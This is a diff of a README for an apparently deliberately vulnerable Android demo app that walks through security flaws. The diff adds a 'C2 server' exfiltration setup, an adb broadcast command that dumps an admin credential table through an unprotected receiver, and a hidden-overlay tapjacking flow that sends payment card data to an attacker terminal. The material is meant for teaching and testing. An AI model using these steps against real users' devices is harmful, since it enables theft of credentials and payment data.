@@ -1,6 +1,9 @@
 # TrustMeBro - Vulnerability Testing Demo
 
 ## Prerequisites
+1. Start C2 Server: `python3 exfil_overlay.py`
+2. Bridge Network: `adb reverse tcp:8080 tcp:8080`
+3. Grant Overlay: Open "Cleaner App" and grant "Display over other apps" permission.
 
 ## Backup configuration leak
 **What it demonstrates**: Plaintext credentials exposed via device backup
@@ -44,35 +47,34 @@ frida -U -f com.example.trustmebro -l dump_keys.js
 ---
 ```
 
-## System IPC Escalation
+## System IPC Escalation (Unauthorized Data Export)
 
-**What it demonstrates**: Unprotected broadcast receiver allows data export from any app
+**What it demonstrates**: An exported Broadcast Receiver with no permission checks allows any malicious app to hijack internal logic and exfiltrate private data.
 
-### Demo Flow (Option A - In App)
+### 1. Normal (Legitimate) Usage
+*   In app: Tap **"Step 3: System IPC Escalation"**
+*   Tap **"Export User Database"**
+*   **Result**: UI shows `INTERNAL BROADCAST RECEIVED`. This is the intended local app behavior.
 
-```bash
-# 1. In app: Tap "Step 3: System IPC Escalation"
-# 2. Enter format: csv
-# 3. Tap "Export User Database"
-# View exported user data with passwords:
-#   john.smith@company.com,john_password_123
-#   jane.doe@company.com,jane_secure_pass
-#   admin@company.com,admin_master_2024
-```
-
-### Demo Flow (Option B - Via ADB Broadcast)
+### 2. The Exploit (Malicious Interception)
+*   Keep the app open on Step 3.
+*   Run the command below (simulating an attack from another app on the device):
 
 ```bash
-# Send broadcast from command line (simulates malicious app)
+# Attacker forces a dump of the ADMIN_CREDENTIALS table
 adb shell am broadcast \
-  -a com.example.trustmebro.EXPORT_USERS \
-  --es format csv \
-  --es table users \
+  -a com.example.trustmebro.EXPORT_DATA \
+  -p com.example.trustmebro \
+  --es format "JSON_DUMP" \
+  --es table "ADMIN_CREDENTIALS" \
   --ez include_passwords true
-
-# The app's receiver catches it automatically
-# No permission checks required
 ```
+
+### 3. Impact Assessment
+*   **UI Update**: The app instantly switches to `⚠EXTERNAL EXPLOIT SUCCESS`.
+*   **Data Breach**: Detailed records (admin hashes, API tokens) appear on the screen and are dumped to system logs.
+*   **Verification**: Check Logcat for the full exfiltrated dataset:
+    `adb logcat | grep VULN_IPC`
 
 ---
 
@@ -156,8 +158,8 @@ window.accountToken
 window.apiKey
 
 # Output:
-# "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjdXN0b21lcl9pZCI6IjEyMzQ1Njc4OTAifQ..."
-# "sk-live-51Iv1oHGiW8h9K0L1M2N3O4P5Q6R7S8T9U0V1W2X3Y4Z5A6B7C8D9E0"
+# "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjdXN0b21lcl9pZCI6IjEyMzQ1Njc4OTAiLCJhY2NvdW50X251bWJlciI6IjU2NzgiLCJzc24iOiI1NTUtNjYtNzc3NyJ9..."
+# "sk-live-51Iv1oHGiW8h9K0L1M2N3O4P5Q6R7S8T9U0V1W2X3Y4Z5A6"
 ```
 
 ### Demo Flow - Inject Malicious Code
@@ -193,19 +195,15 @@ adb shell ls /data/data/com.example.trustmebro/shared_prefs/auth.xml
 
 ## Compositor Overlay Capture
 
-**What it demonstrates**: Missing FLAG_SECURE allows screen capture and overlay attacks
+**What it demonstrates**: Missing FLAG_SECURE allows screen capture and stealth Tapjacking
 
-### Demo Flow - Payment Screen
-
+### Demo Flow - Stealth Tapjacking & Exfiltration
 ```bash
-# 1. In app: Tap "Step 6: Compositor Overlay Capture"
-# 2. View order summary: $107.99
-# 3. Enter payment details:
-#    Card: 4532 1234 5678 9010
-#    Expiry: 12/26
-#    CVV: 123
-# 4. Tap "Pay $107.99"
-# 5. View success message
+# 1. Ensure C2 Server is running and port is reversed
+# 2. Open Cleaner App, tap "Start Optimization" (starts invisible overlay)
+# 3. In TrustMeBro: Tap "Step 6: Compositor Overlay Capture"
+# 4. Enter card details and tap "Pay"
+# 5. Result: Check Attacker Terminal for: "🚨 COMPLETE PAYMENT DATA EXFILTRATED!"
 ```
 
 ### Demo Flow - Screenshot
@@ -215,47 +213,16 @@ adb shell ls /data/data/com.example.trustmebro/shared_prefs/auth.xml
 adb shell screencap -p /sdcard/screenshot.png
 adb pull /sdcard/screenshot.png
 
-# Open image - shows:
-# - Credit card number: 4532 1234 5678 9010
-# - Expiry date: 12/26
-# - CVV: 123
-# (All visible because NO FLAG_SECURE)
+# Open image - shows sensitive details (All visible because NO FLAG_SECURE)
 ```
 
-### Demo Flow - Screen Recording
+### Demo Flow - Check Logcat for Vulnerability Signal
 
 ```bash
-# Record while entering payment
-adb shell screenrecord /sdcard/payment.mp4 --duration 15
+adb logcat | grep TrustMeBro
 
-# While recording, on emulator:
-# - Enter card number: 4532 1234 5678 9010
-# - Enter CVV: 123
-# - Tap pay button
-
-# Pull video
-adb pull /sdcard/payment.mp4
-
-# Video contains all sensitive details typed in real-time
-```
-
-### Demo Flow - Check Logcat
-
-```bash
-adb logcat | grep "TrustMeBro"
-
-# Output shows:
-# Processing payment - Card: 4532 1234 5678 9010 CVV: 123 Expiry: 12/26
-```
-
-### Demo Flow - Verify No FLAG_SECURE
-
-```bash
-# Check source code
-grep -r "FLAG_SECURE" app/src/
-
-# Result: Returns nothing (not used)
-# This is the vulnerability
+# Output confirms tapjacking detection failed to block:
+# [VULNERABILITY] Tapjacking confirmed: Window is obscured by an external overlay.
 ```
 
 ## Remediation (Quick Reference)
